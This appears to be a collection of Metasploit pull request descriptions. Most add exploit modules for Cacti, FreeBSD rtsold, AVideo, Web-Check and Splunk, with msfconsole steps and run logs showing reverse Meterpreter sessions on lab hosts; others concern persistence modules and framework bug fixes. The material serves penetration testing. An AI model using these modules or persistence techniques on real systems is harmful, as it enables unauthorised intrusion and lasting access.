[{"body":"This module exploits an authenticated remote code execution vulnerability in Cacti versions prior to 1.2.29. Authenticated users can upload a graph template through the /graph_templates.php endpoint. The right_axis_label parameter is vulnerable to code injection, allowing attackers to execute arbitrary commands on the server. The payload is length limited, due to this constraint the module starts an HTTP server and hosts the payload. The initial payload downloads the full payload using curl from the attacker's server and saves it to the web root of the cacti server before executing.\r\n\r\n## Verification\r\n\r\n1. Install the application\r\n1. Start msfconsole\r\n1. Do: `use linux/http/cacti_graph_template_rce`\r\n1. Do: `set target <target>`\r\n1. Do: `run rhost=<target address> rport=<target port> lhost=<local address> username=<username> password=<password>`\r\n1. You should get a shell.\r\n\r\n## Testing\r\n### Linux target Cacti 1.2.28\r\n```\r\nmsf exploit(linux/http/cacti_graph_template_rce) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp\r\npayload => cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf exploit(linux/http/cacti_graph_template_rce) > run rhost=172.16.199.136 rport=8080 lhost=172.16.199.1 srvhost=172.16.199.1 srvport=9090 username=admin password=admin\r\n[*] Exploit running as background job 1.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\nmsf exploit(linux/http/cacti_graph_template_rce) > [*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking Cacti version\r\n[+] The web server is running Cacti version 1.2.28\r\n[*] Attempting login with user `admin` and password `admin`\r\n[+] Logged in\r\n[+] The target is vulnerable.\r\n[*] Using URL: http://172.16.199.1:9090/y\r\n[*] Template update response: HTTP 200\r\n[*] Trigger template update response: HTTP 200\r\n[*] 172.16.199.136   cacti_graph_template_rce - Request 'GET /y'\r\n[*] 172.16.199.136   cacti_graph_template_rce - Sending payload ...\r\n[+] PHP payload uploaded successfully to /cacti/X.php\r\n[*] Template update response: HTTP 200\r\n[*] Trigger template update response: HTTP 200\r\n[*] Sending stage (3090404 bytes) to 172.16.199.136\r\n[+] Deleted X.php\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.136:44642) at 2025-12-21 23:27:10 -0800\r\nmsf exploit(linux/http/cacti_graph_template_rce) > sessions -i -1\r\n[*] Starting interaction with 1...\r\n\r\nmeterpreter > getuid\r\nsysServer username: www-data\r\ninfometerpreter > sysinfo\r\nComputer     : 172.18.0.3\r\nOS           : Debian 11.5 (Linux 6.8.0-90-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter > exit\r\n```\r\n","title":"Cacti Graph Template Authenticated RCE [CVE-2025-24367]"},{"body":"# New Module: FreeBSD rtsold/rtsol DNSSL Command Injection (CVE-2025-14558)\r\n\r\nsee https://github.com/rapid7/metasploit-framework/issues/20789\r\n\r\nThis PR adds a new exploit module for CVE-2025-14558, a command injection vulnerability in FreeBSD's `rtsol(8)` and `rtsold(8)` daemons. The vulnerability arises from improper validation of the Domain Name Search List (DNSSL) option in IPv6 Router Advertisement (RA) messages, which are passed to the `resolvconf(8)` script without sanitization. An attacker on the local network can execute arbitrary commands as root by injecting shell metacharacters into the DNSSL domain field.\r\n\r\n## Verification\r\n\r\n- [ ] Start `msfconsole`\r\n- [ ] `use exploit/freebsd/misc/rtsold_dnssl_cmdinject`\r\n- [ ] `set INTERFACE <your_interface>` (e.g., eth0)\r\n- [ ] `set CMD touch /tmp/pwned`\r\n- [ ] `exploit`\r\n- [ ] **Verify** that `Router Advertisement(s) sent successfully` is displayed.\r\n- [ ] **Verify** on the target machine (if available) that `/tmp/pwned` exists.\r\n\r\n## Demo / Proof of Concept\r\n\r\nThis module requires a FreeBSD target system (versions 13.x, 14.x, or 15.0 prior to 2025-12-16 patches) running `rtsold` with the `-s` flag.\r\n\r\n","title":"Add Module and Documentation for CVE-2025-14558"},{"body":"This PR does a slight cleanup of some persistence stuff.\r\n\r\n1. the notepadpp persistence had `persistence` in the name, we don't need that anymore now that theres a persistence folder\r\n2. `persistence_exe` used techniques that are already covered by the service, registry, and task scheduler modules. This is duplicative and no longer needed.","title":"persistence modules cleanup"},{"body":"Updates the udev persistence to the new mixin, Part of #20374\r\n\r\n\r\n## Verification\r\n\r\n- [ ] Start `msfconsole`\r\n- [ ] exploit the box somehow to get a root shell\r\n- [ ] `use exploit/linux/persistence/udev`\r\n- [ ] `set SESSION <id>`\r\n- [ ] `exploit`\r\n- [ ] **Verify** persistence is created, and you get a new session if apt is run\r\n- [ ] **Verify** cleanup works\r\n- [ ] **Document** is updated and correct","title":"update udev to persistence mixin"},{"body":"Hello Metasploit Team,\n\nThis PR adds a new exploit module for **CVE-2025-34433** - an unauthenticated remote code execution vulnerability in AVideo (formerly YouPHPTube), affecting versions 14.3.1 through 20.0.\n\n## Summary\n\nThis module exploits a critical cryptographic weakness in AVideo's salt generation mechanism combined with information disclosure vulnerabilities. The attack chain:\n\n1. **Timestamp Leak**: Installation timestamp leaked from `/objects/categories.json.php` (first 8 hex chars of salt)\n2. **hashId Leak**: Encrypted video ID leaked from public API endpoints\n3. **Offline Bruteforce**: Remaining 5 hex characters bruteforced offline (~1M possibilities, 3-5 seconds)\n4. **RCE Trigger**: Recovered salt used to encrypt payload for `notify.ffmpeg.json.php` which calls `eval($callback)`\n\nThe vulnerability requires no authentication and can be exploited remotely by any attacker with network access to the AVideo instance.\n\n**CVE IDs:**\n- CVE-2025-34433 (Unauthenticated RCE via Predictable Salt)\n- CVE-2025-34441 (Information Disclosure: hashId leak)\n- CVE-2025-34442 (Information Disclosure: System Path leak)\n\n**References:**\n- [Researcher Blog Post](https://chocapikk.com/posts/2025/avideo-security-vulnerabilities/)\n- [VulnCheck Advisory](https://www.vulncheck.com/advisories/avideo-unauthenticated-rce-via-predictable-installation-salt)\n- [AVideo Fix PR](https://github.com/WWBN/AVideo/pull/10284)\n\n## Verification\n\n- [ ] Start `msfconsole`\n- [ ] `use exploit/multi/http/avideo_notify_ffmpeg_unauth_rce`\n- [ ] `set RHOSTS <target_ip>`\n- [ ] `set RPORT <target_port>`\n- [ ] `set LHOST <your_ip>`\n- [ ] `set PAYLOAD php/meterpreter/reverse_tcp`\n- [ ] `run`\n- [ ] **Verify** that a Meterpreter session is obtained\n- [ ] **Verify** that the module correctly bruteforces the salt and exploits the target\n- [ ] **Document** - Documentation included at `documentation/modules/exploit/multi/http/avideo_notify_ffmpeg_unauth_rce.md`\n\n### Tested Payloads\n\n| Target | Payload | Status |\n|--------|---------|--------|\n| PHP In-Memory | `php/meterpreter/reverse_tcp` | ✓ Working |\n| Unix/Linux Command Shell | `cmd/linux/http/x64/meterpreter_reverse_tcp` | ✓ Working |\n\n### Test Environment\n\n- **AVideo Versions**: 18.1, 20.0 (Docker)\n- **OS**: Ubuntu 24.04 (Docker container)\n- **Setup**: Docker Compose environment as described in the module documentation\n\nThank you for reviewing!\n\n","title":"Add AVideo notify.ffmpeg.json.php unauthenticated RCE exploit (CVE-2025-34433)"},{"body":"Hello Metasploit Team,\n\nThis PR adds an exploit module for CVE-2025-32778, a command injection vulnerability in Web-Check's screenshot API endpoint. The vulnerability allows unauthenticated remote code execution by injecting shell commands via URL query parameters in the `/api/screenshot` endpoint.\n\n## Verification\n\nList the steps needed to make sure this thing works\n\n- [ ] Start `msfconsole`\n- [ ] `use exploit/multi/http/web_check_screenshot_rce`\n- [ ] `set RHOSTS <target_ip>`\n- [ ] `set RPORT 3000`\n- [ ] `set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp`\n- [ ] `set LHOST <listener_ip>`\n- [ ] `run`\n- [ ] **Verify** the module detects the vulnerability via timing-based check\n- [ ] **Verify** a meterpreter session is established\n- [ ] **Verify** commands can be executed in the session","title":"Add Web-Check screenshot API command injection RCE exploit (CVE-2025-32778)"},{"body":"Fixes #20603 by updating the module code to merge the target Arch and Platform entries into the module's top level data. An AI generated script was then used to update all exploit modules to remove redundant entries that are no longer required. As a bonus this also enables Author and References to be included in the target hash and they are also merged up. I then went through and moved a bunch of authors into their targets when there was a comment that made it clear they were the author of one or more specific target. There should be no noticable changes for end users but module authors now don't have to worry about setting the merged module metadata when they already specified it in the target.\r\n\r\nThe diff was relatively clear before robocop got involved. I recommend reviewing the changes one commit at a time.\r\n\r\n## Verification\r\n\r\n- [ ] See platform and arch is set using `exploit/multi/http/atlassian_confluence_rce_cve_2023_22527` as an example\r\n- [ ] Use the module, then run `info` and see the Platform and Arch data in the module info at the top\r\n- [ ] Review the source code see the Platform and Arch are now only specified in the targets\r\n- [ ] See authors are merged up using `exploit/multi/script/web_delivery` as an example\r\n- [ ] Use the module, then run `info` see that `bcoles` in particular shows up exactly once as a module author\r\n- [ ] Review the source code and see his name is not listed at the module level but is included in multiple targets, this also demonstrates that the list is uniqued\r\n- [ ] To review the changes at scale, run `TZ=UTC tools/automation/cache/build_new_cache.sh` from the framework directory\r\n- [ ] Review the new `db/modules_metadata_base.json`, see that there are changes but the changes are due to inaccuracies that were previously in the modules\r\n\r\n<details>\r\n<summary>AI refactor code</summary>\r\n\r\nIncluding this for future reference but it has served its purpose.\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nRefactor Metasploit modules to remove redundant Platform/Arch definitions\r\nat the module level when they're already defined in Targets.\r\n\"\"\"\r\n\r\nimport re\r\nimport argparse\r\nfrom pathlib import Path\r\nfrom typing import List, Tuple, Optional\r\n\r\n\r\ndef extract_targets_info(content: str) -> Tuple[bool, bool]:\r\n    \"\"\"\r\n    Check if Targets array contains Platform and/or Arch definitions.\r\n    Returns: (has_platform_in_targets, has_arch_in_targets)\r\n    \"\"\"\r\n    # Find the Targets array - need to handle nested brackets carefully\r\n    targets_match = re.search(\r\n        r\"'Targets'\\s*=>\\s*\\[\",\r\n        content,\r\n        re.DOTALL\r\n    )\r\n    \r\n    if not targets_match:\r\n        return False, False\r\n    \r\n    # Find the matching closing bracket for Targets array\r\n    start_pos = targets_match.end()\r\n    bracket_count = 1\r\n    pos = start_pos\r\n    \r\n    while pos < len(content) and bracket_count > 0:\r\n        if content[pos] == '[':\r\n            bracket_count += 1\r\n        elif content[pos] == ']':\r\n            bracket_count -= 1\r\n        pos += 1\r\n    \r\n    if bracket_count != 0:\r\n        return False, False\r\n    \r\n    targets_content = content[start_pos:pos-1]\r\n    \r\n    # Check if any target has Platform definition\r\n    has_platform = bool(re.search(r\"'Platform'\\s*=>\", targets_content))\r\n    \r\n    # Check if any target has Arch definition\r\n    has_arch = bool(re.search(r\"'Arch'\\s*=>\", targets_content))\r\n    \r\n    return has_platform, has_arch\r\n\r\n\r\ndef find_module_level_definitions(content: str) -> Tuple[Optional[re.Match], Optional[re.Match]]:\r\n    \"\"\"\r\n    Find module-level Platform and Arch definitions (commented or uncommented).\r\n    These should be in the update_info hash, NOT inside Targets.\r\n    Returns: (platform_match, arch_match) with positions adjusted to full content\r\n    \"\"\"\r\n    # Helper class to adjust match positions\r\n    class AdjustedMatch:\r\n        def __init__(self, original_match, offset):\r\n            self._match = original_match\r\n            self._offset = offset\r\n        \r\n        def start(self):\r\n            return self._match.start() + self._offset\r\n        \r\n        def end(self):\r\n            return self._match.end() + self._offset\r\n        \r\n        def group(self, n=0):\r\n            return self._match.group(n)\r\n    \r\n    # Find where Targets array starts\r\n    targets_start_match = re.search(r\"'Targets'\\s*=>\\s*\\[\", content)\r\n    \r\n    if targets_start_match:\r\n        # Only search before the Targets definition\r\n        search_content = content[:targets_start_match.start()]\r\n        search_offset = 0\r\n    else:\r\n        search_content = content\r\n        search_offset = 0\r\n    \r\n    # Look for Platform at module level (may be commented)\r\n    # Handle both ['x', 'y'], %w[x y], and %w{x y} notation\r\n    # Use [ \\t]* instead of \\s* to avoid matching newlines\r\n    platform_pattern = r\"^([ \\t]*)(#[ \\t]*)?(\\'Platform\\'[ \\t]*=>[ \\t]*(?:\\[.*?\\]|%w[\\[\\{].*?[\\]\\}]))[ \\t]*,?[ \\t]*$\"\r\n    platform_match_temp = re.search(platform_pattern, search_content, re.MULTILINE)\r\n    \r\n    # Look for Arch at module level (may be commented)\r\n    # Handle both single values and arrays\r\n    # Use [ \\t]* instead of \\s* to avoid matching newlines\r\n    # Include digits in constant names: ARCH_X86, ARCH_X64, etc.\r\n    arch_pattern = r\"^([ \\t]*)(#[ \\t]*)?(\\'Arch\\'[ \\t]*=>[ \\t]*(?:\\[.*?\\]|[A-Z0-9_]+))[ \\t]*,?[ \\t]*$\"\r\n    arch_match_temp = re.search(arch_pattern, search_content, re.MULTILINE)\r\n    \r\n    # Create adjusted match objects\r\n    platform_match = AdjustedMatch(platform_match_temp, search_offset) if platform_match_temp else None\r\n    arch_match = AdjustedMatch(arch_match_temp, search_offset) if arch_match_temp else None\r\n    \r\n    return platform_match, arch_match\r\n\r\n\r\ndef remove_line_with_surrounding_whitespace(content: str, match: re.Match) -> str:\r\n    \"\"\"Remove a matched line including its newline.\"\"\"\r\n    start = match.start()\r\n    end = match.end()\r\n    \r\n    # Find the start of the line\r\n    line_start = content.rfind('\\n', 0, start)\r\n    if line_start == -1:\r\n        line_start = 0\r\n    else:\r\n        line_start += 1\r\n    \r\n    # Find the end of the line (include the newline)\r\n    line_end = content.find('\\n', end)\r\n    if line_end == -1:\r\n        line_end = len(content)\r\n    else:\r\n        line_end += 1\r\n    \r\n    return content[:line_start] + content[line_end:]\r\n\r\n\r\ndef refactor_module(file_path: Path, dry_run: bool = True) -> Optional[str]:\r\n    \"\"\"\r\n    Refactor a single module file.\r\n    Returns a status message or None if no changes needed.\r\n    \"\"\"\r\n    try:\r\n        content = file_path.read_text()\r\n    except Exception as e:\r\n        return f\"ERROR reading {file_path}: {e}\"\r\n    \r\n    # Check if this file has Targets with Platform/Arch\r\n    has_platform_in_targets, has_arch_in_targets = extract_targets_info(content)\r\n    \r\n    if not (has_platform_in_targets or has_arch_in_targets):\r\n        return None  # Nothing to refactor\r\n    \r\n    # Find module-level definitions\r\n    platform_match, arch_match = find_module_level_definitions(content)\r\n    \r\n    # Collect all matches that need to be removed\r\n    matches_to_remove = []\r\n    changes = []\r\n    \r\n    if has_platform_in_targets and platform_match:\r\n        matches_to_remove.append(('Platform', platform_match))\r\n        changes.append(\"Platform\")\r\n    \r\n    if has_arch_in_targets and arch_match:\r\n        matches_to_remove.append(('Arch', arch_match))\r\n        changes.append(\"Arch\")\r\n    \r\n    if not matches_to_remove:\r\n        return None\r\n    \r\n    # Sort matches by position (descending) so we remove from bottom to top\r\n    # This prevents position shifting issues\r\n    matches_to_remove.sort(key=lambda x: x[1].start(), reverse=True)\r\n    \r\n    # Remove all matches\r\n    modified_content = content\r\n    for _, match in matches_to_remove:\r\n        modified_content = remove_line_with_surrounding_whitespace(modified_content, match)\r\n    \r\n    if not changes:\r\n        return None\r\n    \r\n    if not dry_run:\r\n        file_path.write_text(modified_content)\r\n        return f\"MODIFIED {file_path}: Removed {', '.join(changes)}\"\r\n    else:\r\n        return f\"WOULD MODIFY {file_path}: Would remove {', '.join(changes)}\"\r\n\r\n\r\ndef find_module_files(base_path: Path, pattern: str = \"**/*.rb\") -> List[Path]:\r\n    \"\"\"Find all Ruby module files.\"\"\"\r\n    return list(base_path.glob(pattern))\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Refactor Metasploit modules to remove redundant Platform/Arch definitions\"\r\n    )\r\n    parser.add_argument(\r\n        \"path\",\r\n        type=Path,\r\n        help=\"Path to modules directory or single module file\"\r\n    )\r\n    parser.add_argument(\r\n        \"--dry-run\",\r\n        action=\"store_true\",\r\n        default=True,\r\n        help=\"Show what would be changed without modifying files (default)\"\r\n    )\r\n    parser.add_argument(\r\n        \"--apply\",\r\n        action=\"store_true\",\r\n        help=\"Actually modify the files (overrides --dry-run)\"\r\n    )\r\n    parser.add_argument(\r\n        \"--pattern\",\r\n        default=\"**/*.rb\",\r\n        help=\"Glob pattern for finding module files (default: **/*.rb)\"\r\n    )\r\n    \r\n    args = parser.parse_args()\r\n    \r\n    dry_run = not args.apply\r\n    \r\n    if args.path.is_file():\r\n        files = [args.path]\r\n    else:\r\n        files = find_module_files(args.path, args.pattern)\r\n    \r\n    print(f\"{'DRY RUN - ' if dry_run else ''}Processing {len(files)} files...\")\r\n    print()\r\n    \r\n    modified_count = 0\r\n    error_count = 0\r\n    \r\n    for file_path in files:\r\n        result = refactor_module(file_path, dry_run)\r\n        if result:\r\n            print(result)\r\n            if result.startswith(\"ERROR\"):\r\n                error_count += 1\r\n            else:\r\n                modified_count += 1\r\n    \r\n    print()\r\n    print(f\"Summary: {modified_count} files {'would be ' if dry_run else ''}modified, {error_count} errors\")\r\n    \r\n    if dry_run and modified_count > 0:\r\n        print(\"\\nRun with --apply to actually modify the files\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n</details>","title":"Merge target info into the module info"},{"body":"Hello Metasploit team,\n\nThis PR adds Waku framework support to the existing react2shell module (CVE-2025-55182).\n\n**Changes:**\n- Extended the module to support both Next.js and Waku frameworks\n- Implemented framework-specific payload generation and endpoint handling\n- Added dynamic variant generation for both frameworks\n- Updated documentation with Waku lab setup and usage examples\n\n**Testing:**\n- Tested with Next.js 15.0.0 on Unix and Windows\n- Tested with Waku 0.12.4-0.26.0-alpha.2-0 on Unix and Windows\n- All payloads verified working (cmd/unix/generic, cmd/unix/reverse_bash, cmd/linux/http/x64/meterpreter/reverse_tcp)\n\nThe module maintains backward compatibility with existing Next.js targets while adding Waku support through a modular framework configuration system.\n\n","title":"Update react2shell module: Add Waku framework support"},{"body":"## Description\r\nThis PR adds an auxiliary scanner module for CVE-2025-49132, a path traversal vulnerability in Pterodactyl Panel. The vulnerability allows unauthenticated attackers to read the configuration file (including APP_KEY) via the `/locales/locale.json` endpoint.\r\n\r\n## Verification\r\n- [ ] Start `msfconsole`\r\n- [ ] `use auxiliary/scanner/http/pterodactyl_traversal_cve_2025_49132`\r\n- [ ] `set RHOSTS <vulnerable_ip>`\r\n- [ ] `run`\r\n- [ ] Verify that the module detects the vulnerability and reports it.","title":"Add auxiliary module for Pterodactyl Panel CVE-2025-49132"},{"body":"Combines the Windows and Linux ssh key persistence modules, then applies the new mixin. Part of https://github.com/rapid7/metasploit-framework/issues/20374\r\n\r\n## Verification\r\n\r\nSee documentation","title":"Update and combine ssh key persistence with mixin"},{"body":"# Fix PostgreSQL 15+ Public Schema Permission Issue\r\n\r\n## Summary\r\n\r\nFixes database initialization failure when using `msfdb init` with `--connection-string` option to connect to PostgreSQL 15+ instances (e.g., Docker containers).\r\n\r\n## Problem\r\n\r\nWhen initializing Metasploit database with a standalone PostgreSQL 15+ connection, the following errors occur:\r\n\r\n```\r\nPG::UndefinedTable: ERROR: relation \"workspaces\" does not exist\r\nERROR: permission denied for schema public at character 14\r\n```\r\n\r\n**Root Cause:** PostgreSQL 15+ changed default permissions - users can no longer create objects in the `public` schema without explicit `GRANT` permissions. When using `--connection-string`, the privileged user (e.g., `postgres`) creates the databases, but the `msf` user lacks permission to create tables.\r\n\r\n## Solution\r\n\r\nAdded explicit `GRANT ALL ON SCHEMA public` permissions to the `msf` and `msftest` users after database creation in `lib/msfdb_helpers/standalone.rb`.\r\n\r\n## Verification\r\n\r\n### Steps to Reproduce (Before Fix)\r\n\r\n1. Start PostgreSQL 16 container:\r\n   ```bash\r\n   docker run --name test-postgres -e POSTGRES_PASSWORD=postgres -p 5432:5432 -d postgres:16\r\n   ```\r\n\r\n2. Initialize database:\r\n   ```bash\r\n   cd /opt/metasploit\r\n   bundle exec ./msfdb init --connection-string=\"postgresql://postgres:postgres@127.0.0.1:5432/postgres\"\r\n   ```\r\n\r\n3. Start msfconsole:\r\n   ```bash\r\n   bundle exec ./msfconsole -y ~/.msf4/database.yaml\r\n   ```\r\n\r\n**Expected Error (Before Fix):**\r\n```\r\nPG::UndefinedTable: ERROR: relation \"workspaces\" does not exist\r\nERROR: permission denied for schema public\r\n```\r\n\r\n### Steps to Verify (After Fix)\r\n\r\n1. Start PostgreSQL 16 container:\r\n   ```bash\r\n   docker run --name test-postgres -e POSTGRES_PASSWORD=postgres -p 5432:5432 -d postgres:16\r\n   ```\r\n\r\n2. Initialize database:\r\n   ```bash\r\n   cd /opt/metasploit\r\n   bundle exec ./msfdb init --connection-string=\"postgresql://postgres:postgres@127.0.0.1:5432/postgres\"\r\n   ```\r\n\r\n3. Verify connection:\r\n   ```bash\r\n   bundle exec ./msfconsole -q -x \"db_status; exit\"\r\n   ```\r\n\r\n**Expected Output (After Fix):**\r\n```\r\nRunning the 'init' command for the database:\r\nCreating initial database schema\r\nDatabase initialization successful\r\n\r\n[*] Connected to msf. Connection type: postgresql.\r\n```\r\n\r\n- [x] Database initialization succeeds\r\n- [x] `msfconsole` connects to database successfully\r\n- [x] No permission errors in PostgreSQL logs\r\n- [x] Works with PostgreSQL 15, 16, and later versions\r\n- [x] Backward compatible with PostgreSQL < 15\r\n\r\n## Files Changed\r\n\r\n- `lib/msfdb_helpers/standalone.rb` - Added schema permission grants after database creation\r\n\r\n## Technical Details\r\n\r\n### Code Change\r\n\r\n```ruby\r\n# After creating databases, grant schema permissions\r\nconninfo = @conn.conninfo_hash\r\n[@options[:msf_db_name], @options[:msftest_db_name]].each_with_index do |db_name, idx|\r\n  db_user = idx == 0 ? @options[:msf_db_user] : @options[:msftest_db_user]\r\n  db_conn = PG.connect(host: conninfo[:host], port: conninfo[:port], dbname: db_name,\r\n                       user: conninfo[:user], password: conninfo[:password])\r\n  db_conn.exec(\"GRANT ALL ON SCHEMA public TO #{db_user}\")\r\n  db_conn.finish\r\nend\r\n```\r\n\r\n### Why This Works\r\n\r\n- PostgreSQL 15+ requires explicit schema permissions\r\n- The `GRANT ALL ON SCHEMA public` command gives the `msf` user full permissions\r\n- This is backward compatible - older PostgreSQL versions ignore the redundant grant\r\n\r\n## Fixes: [#20649](https://github.com/rapid7/metasploit-framework/issues/20649)\r\n","title":"Fix PostgreSQL 15+ public schema permission issue"},{"body":"# Bug Fix: shell_bind_aws_ssm Session Fails with Database Connected\r\n\r\n## Issue Summary\r\n\r\nThe `payload/generic/shell_bind_aws_ssm` module failed to establish a session when a database was connected to Metasploit Framework, while working correctly without a database connection.\r\n\r\n## Steps to Reproduce\r\n\r\n1. Disconnect the database\r\n2. Setup an SSM target\r\n3. Set the `ACCESS_KEY_ID`, `EC2_ID`, `REGION` and `SECRET_ACCESS_KEY` datastore options\r\n4. Run the module → Session establishes successfully\r\n5. Connect a database and run the module → **No session established**\r\n\r\n## Root Cause Analysis\r\n\r\nThe bug was located in `lib/msf/util/host.rb` at line 46.\r\n\r\n### The Bug\r\n\r\n```ruby\r\ndef self.normalize_host(host)\r\n  # ... earlier code ...\r\n  \r\n  # If we got here and don't have a norm_host yet, it could be a\r\n  # Msf::Session object with an empty or nil tunnel_host and tunnel_peer;\r\n  # see if it has a socket and use its peerhost if so.\r\n  if (\r\n  norm_host.nil? &&\r\n      host.respond_to?(:sock) &&\r\n      host.sock.respond_to?(:peerhost) &&\r\n      host.sock.peerhost.to_s.length > 0\r\n  )\r\n    norm_host = session.sock.peerhost  # BUG: 'session' is undefined!\r\n  end\r\n  \r\n  # ... rest of code ...\r\nend\r\n```\r\n\r\nThe variable `session` does not exist in this method scope - it should be `host`.\r\n\r\n### Why Database Connection Triggered the Bug\r\n\r\nThe execution flow when a database is connected:\r\n\r\n1. Session is created and `on_session_open` event fires\r\n2. `lib/msf/core/framework.rb` handles the event:\r\n   ```ruby\r\n   def on_session_open(session)\r\n     opts = { :datastore => session.exploit_datastore.to_h, :critical => true }\r\n     session_event('session_open', session, opts)\r\n     framework.db.report_session(:session => session)  # Only called when DB is active!\r\n   end\r\n   ```\r\n3. `report_session` calls `create_mdm_session_from_session` which calls:\r\n   ```ruby\r\n   host = Msf::Util::Host.normalize_host(session)\r\n   ```\r\n4. For AWS SSM sessions, `session_host` returns `nil` because host info is stored in `peer_info` hash, not in standard session attributes\r\n5. Code falls through to the `sock.peerhost` fallback at lines 40-46\r\n6. Line 46 references undefined `session` variable → `NameError` exception\r\n7. Exception prevents session registration\r\n\r\n**Without a database**, `framework.db.report_session` is never called, so the buggy code path is never executed.\r\n\r\n## The Fix\r\n\r\n**File:** `lib/msf/util/host.rb`  \r\n**Line:** 46\r\n\r\n### Before\r\n```ruby\r\nnorm_host = session.sock.peerhost\r\n```\r\n\r\n### After\r\n```ruby\r\nnorm_host = host.sock.peerhost\r\n```\r\n\r\n## Files Modified\r\n\r\n- `lib/msf/util/host.rb` - Fixed typo on line 46\r\n\r\n## Impact\r\n\r\nThis fix resolves session establishment issues for any session type where:\r\n1. A database is connected\r\n2. The session's `session_host` method returns `nil`\r\n3. The session has a `sock` attribute with valid `peerhost` information\r\n\r\nThis primarily affects:\r\n- `payload/generic/shell_bind_aws_ssm`\r\n- Potentially other custom or edge-case session types with similar characteristics\r\n\r\n## Testing Recommendations\r\n\r\n1. Connect a PostgreSQL database to Metasploit\r\n2. Configure and run `payload/generic/shell_bind_aws_ssm` against an SSM target\r\n3. Verify session establishes successfully\r\n4. Verify session is properly recorded in the database\r\n\r\n## Date\r\n\r\nDecember 12, 2025\r\n\r\nFixes: [#20675](https://github.com/rapid7/metasploit-framework/issues/20675)\r\n","title":"Fix undefined variable in Host.normalize_host causing session failures when DB is connected"},{"body":"# CVE-2022-43571\r\n\r\n## Vulnerability Details\r\n\r\nThis Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise.\r\n\r\nAn attacker can inject arbitrary Python code into style parameters, such as the `fillColor` or `lineColor` of a sparkline element within a Splunk SimpleXML dashboard. \r\nThe malicious code is executed when a user triggers the PDF export function for the dashboard.\r\n\r\nThe affected versions include any release prior to 8.1.12, as well as versions 8.2.0 through 8.2.9 and 9.0.0 through 9.0.2.\r\n\r\n## Module Information\r\n\r\nModule path: `modules/exploits/multi/http/splunk_auth_rce_cve_2022_43571.rb`\r\nPlatform: `Linux/Unix/Windows`\r\n\r\n## References\r\n\r\n- https://advisory.splunk.com/advisories/SVD-2022-1111\r\n- https://web.archive.org/web/20221218233608/https://psytester.github.io/CVE-2022-43571_SPLUNK_RCE/\r\n\r\n## Test Output\r\n\r\n### Linux\r\n```\r\nmsf6 > use multi/http/splunk_auth_rce_cve_2022\r\n[*] No payload configured, defaulting to python/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set RHOSTS 192.168.19.139\r\nRHOSTS => 192.168.19.139\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set RPORT 8000\r\nRPORT => 8000\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set PASSWORD password123\r\nPASSWORD => password123\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.19.130:4444 \r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] SUCCESSFUL LOGIN. 'admin' : 'password123'\r\n[+] The target appears to be vulnerable. Exploitable version found: 8.2.4\r\n[*] Sending stage (24772 bytes) to 192.168.19.139\r\n[*] Meterpreter session 2 opened (192.168.19.130:4444 -> 192.168.19.139:59524) at 2025-12-12 15:11:44 -0500\r\n\r\nmeterpreter > sysinfo\r\nComputer        : ubuntu\r\nOS              : Linux 5.4.0-150-generic #167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nMeterpreter     : python/linux\r\nmeterpreter > getuid\r\nServer username: root\r\n```\r\n\r\n### Windows\r\n\r\n```\r\nmsf6 > use multi/http/splunk_auth_rce_cve_2022_43571\r\n[*] No payload configured, defaulting to python/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set RHOSTS 192.168.19.137\r\nRHOSTS => 192.168.19.137\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set RPORT 8000\r\nRPORT => 8000\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > set PASSWORD password123\r\nPASSWORD => password123\r\nmsf6 exploit(multi/http/splunk_auth_rce_cve_2022_43571) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.19.130:4444 \r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] SUCCESSFUL LOGIN. 'admin' : 'password123'\r\n[+] The target appears to be vulnerable. Exploitable version found: 8.2.6\r\n[*] Sending stage (24772 bytes) to 192.168.19.137\r\n[*] Meterpreter session 3 opened (192.168.19.130:4444 -> 192.168.19.137:62128) at 2025-12-12 15:21:53 -0500\r\n\r\nmeterpreter > sysinfo\r\nComputer        : DESKTOP-vognik\r\nOS              : Windows 10 (Build 19044)\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nMeterpreter     : python/windows\r\nmeterpreter > getuid\r\nServer username: NT AUTHORITY\\SYSTEM\r\n```\r\n\r\n------------\r\n\r\n# CVE-2024-36985\r\n\r\n## Vulnerability Details\r\n\r\nThis Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise (splunk_archiver application).\r\n\r\nThe flaw is rooted in the unsafe use of a Splunk lookup function, specifically `| copybuckets`, within the splunk_archiver application, which ultimately leads to the execution of the helper script sudobash with attacker-controlled arguments.\r\n\r\nThe affected versions include any release prior to 9.0.10, as well as versions 9.1.2 through 9.1.5 and 9.2.0 through 9.2.2.\r\n\r\n## Module Information\r\n\r\nModule path: `modules/exploits/linux/http/splunk_auth_rce_cve_2024_36985.rb`\r\nPlatform: `Linux/Unix`\r\n\r\n## References\r\n\r\n- https://advisory.splunk.com/advisories/SVD-2024-0705\r\n- 